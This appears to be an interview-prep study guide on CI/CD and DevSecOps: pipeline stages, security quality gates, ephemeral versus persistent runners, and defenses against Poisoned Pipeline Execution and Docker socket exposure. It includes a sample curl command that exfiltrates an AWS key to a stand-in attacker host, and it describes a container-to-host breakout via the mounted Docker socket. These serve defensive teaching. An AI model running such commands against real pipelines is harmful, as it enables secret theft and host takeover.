# CI/CD Pipeline Architecture, Security Quality Gates, and Runner Hardening

## 1. Topic & Definition
**Continuous Integration and Continuous Delivery / Deployment (CI/CD)** is the automated engineering backbone that compiles, tests, validates, and deploys software releases into production infrastructure.

**DevSecOps** injects security controls, automated scanners, and cryptographic compliance checks across every phase of the delivery pipeline ("Shifting Left"), transforming the CI/CD pipeline from a purely functional build engine into an automated **Security Enforcement and Quality Gate**.

```
+---------------------------------------------------------------------------------------------------+
|                           The Modern DevSecOps CI/CD Pipeline                                    |
+---------------------------------------------------------------------------------------------------+
  STAGE 1: Code & Pre-Commit  --> Secret Scanning (Gitleaks) + IDE Linters
  STAGE 2: Continuous Integration --> Build + Unit Tests + SAST (Semgrep) + SCA (Trivy/Snyk)
  STAGE 3: Container & Artifact   --> Container Image Scanning (Trivy) + SBOM Generation + Cosign Signing
  STAGE 4: Staging & Dynamic Test --> DAST (OWASP ZAP) + IAST + Security Integration Tests
  STAGE 5: Production Deployment  --> Ephemeral Cloud Runner + OIDC Workload Auth + Verification Gate
```

---

## 2. CI vs. CD: Definitions and Distinctions
- **Continuous Integration (CI):** Developers merge code into the shared mainline daily. Every commit triggers automated builds and automated tests to identify integration defects early.
- **Continuous Delivery (CD):** Every valid build that passes all automated tests and security gates is automatically packaged and staged in a deployable state. Production deployment requires an explicit manual human approval gate.
- **Continuous Deployment (CD):** Every change that successfully navigates all automated quality and security gates is automatically released directly to production customers without manual intervention.

---

## 3. Security Quality Gates (Shift-Left Controls)

A **Security Quality Gate** is an automated policy checkpoint in the pipeline that halts execution (breaks the build with non-zero exit code) if security metrics violate defined organizational thresholds:

```
+-----------------------------+---------------------------------------+-----------------------------+
| Pipeline Stage              | Automated Security Tooling            | Quality Gate Pass Criteria  |
+-----------------------------+---------------------------------------+-----------------------------+
| **Source Commit**           | Gitleaks / TruffleHog                 | **Zero High-Entropy Secrets**|
| **Static Code Analysis**    | Semgrep / SonarQube                   | **Zero Critical/High SAST** |
| **Dependency Analysis**     | Snyk / OSV / Dependency-Check (SCA)   | **No Known Exploitable CVEs**|
| **Container Build**         | Trivy / Grype                         | **Zero Critical OS CVEs**   |
| **Artifact Packaging**      | Syft (SBOM) + Cosign (Sigstore)       | **Cryptographic Signature OK|
| **Infrastructure (IaC)**    | Checkov / tfsec / OPA Rego            | **Zero Cloud Misconfigs**   |
| **Staging Environment**     | OWASP ZAP (DAST)                      | **No OWASP Top 10 Bypasses**|
+-----------------------------+---------------------------------------+-----------------------------+
```

---

## 4. Runner Architecture: Self-Hosted vs. Cloud Ephemeral Runners

```
+---------------------------------------------------------------------------------------------------+
|                                CI/CD Runner Architecture Comparison                               |
+---------------------------------------------------------------------------------------------------+

  SELF-HOSTED PERSISTENT RUNNER (HIGH RISK):
  VM / Server persists across builds ---> Build 1 executes untrusted PR code ---> Plants backdoor
                                          Build 2 runs production deploy      ---> STEALS SECRETS!

  CLOUD EPHEMERAL RUNNER (GOLD STANDARD):
  Build Triggered ---> Spins up fresh isolated microVM ---> Executes single job ---> DESTROYS MICROVM!
```

- **Persistent Self-Hosted Runners:** Run on dedicated virtual machines inside the corporate VPC. Build artifacts, environment variables, and Docker daemon sockets linger between jobs, creating extreme lateral movement risks.
- **Ephemeral Isolated Runners (GitHub-Hosted, AWS Fargate, Kubernetes Job Runners):** Every build executes within a single-use, clean container or microVM that is terminated and wiped immediately upon job completion, guaranteeing that state and untrusted code cannot persist.

---

## 5. Key Differences Matrix: Delivery vs Deployment

| Dimension | Continuous Delivery | Continuous Deployment |
| :--- | :--- | :--- |
| **Production Gate** | **Manual Human Approval Button** | **100% Automated** |
| **Deployment Trigger** | Business release decision / Scheduled | Passing all automated pipeline tests |
| **Risk Tolerance** | Lower (Regulated Banking, Healthcare) | Higher (Rapid SaaS, Feature-flagged web) |
| **Rollback Strategy** | Blue-Green / Canary Deployments | Automated Canary Rollbacks via Metrics |
| **Compliance Requirement**| Separation of duties (Auditors mandate) | Strict automated audit logs & attestations |

---

## 6. Cybersecurity Relevance, Threats & Attack Vectors

### 1. Poisoned Pipeline Execution (PPE) & Malicious Pull Requests
- **Vulnerability:** A public or open-source repository runs CI pipelines on incoming Pull Requests (`pull_request` event in GitHub Actions).
- **Exploitation:**
  1. An external attacker forks the repository and creates a Pull Request modifying `.github/workflows/build.yml`.
  2. The attacker's modified workflow script executes:
     `curl -X POST https://attacker.com/steal -d "$PROD_AWS_KEY"`
  3. When GitHub Actions triggers the build on the PR, the pipeline runs the attacker's script and exfiltrates organizational repository secrets!
- **Defenses:**
  - Never expose secrets to workflows triggered by `pull_request` from forks (use `pull_request_target` with extreme caution).
  - Enforce "Require approval for all outside collaborators" before running workflows.
  - Run PR workflows in isolated, unprivileged environments without access to production deployment secrets.

### 2. Docker Socket Mounting Vulnerability (`/var/run/docker.sock`)
- **Mechanism:** To build Docker images inside CI containers (Docker-in-Docker / DinD), administrators frequently mount the host Docker socket into the runner container:
  `-v /var/run/docker.sock:/var/run/docker.sock`
- **Impact:** Any code running inside the runner container can interact with the host Docker daemon. The container can spin up a new container with `-v /:/host` and achieve **instant, root-level breakout to the underlying host node**!
- **Defense:** Use daemonless container builders like **Kaniko** or **Buildah**, which build container images inside standard user space without requiring Docker daemon access or privileged flags.

---

## 7. Interview Takeaways & Rapid-Fire Q&A

### 60-Second Elevator Pitch
> *"Modern CI/CD pipelines automate the path from source code to production release, but they also represent one of the most privileged attack surfaces in the enterprise. DevSecOps embeds automated security quality gates at every stage—blocking builds on detected secrets, critical SAST vulnerabilities, unpatched open-source dependencies (SCA), and container vulnerabilities. To secure the pipeline infrastructure itself, organizations must eliminate persistent shared runners in favor of ephemeral, single-use runners that terminate after each build, replace static long-lived cloud keys with OIDC workload federation, and harden against Poisoned Pipeline Execution (PPE) by strictly isolating untrusted Pull Request workflows from production deployment secrets."*

### Candidate Traps & Common Mistakes
- **Trap 1:** Mounting `/var/run/docker.sock` into CI runner containers. *Correction:* Mounting the Docker socket grants full root privileges on the host node; use rootless, daemonless image builders like Kaniko.
- **Trap 2:** Exposing production secrets to `pull_request` events from external forks. *Correction:* This enables trivial Poisoned Pipeline Execution (PPE); untrusted PRs must run with zero production secrets.
- **Trap 3:** Confusing Continuous Delivery with Continuous Deployment. *Correction:* Continuous Delivery automates up to the point of a manual release approval gate; Continuous Deployment pushes straight to production autonomously.

### Expected Follow-Up Questions
1. *What is Poisoned Pipeline Execution (PPE)?*
   - An attack where an adversary alters pipeline configuration files inside a pull request to execute arbitrary malicious code and exfiltrate secrets during automated CI runner execution.
2. *How does GitHub Actions OIDC eliminate static AWS credentials in CI/CD?*
   - GitHub Actions issues an OpenID Connect (OIDC) token signed by GitHub's private key. The runner presents this token to AWS STS using an IAM Role trust policy, exchanging it for short-lived (1-hour) temporary AWS credentials without storing an AWS access key anywhere in the GitHub repository.
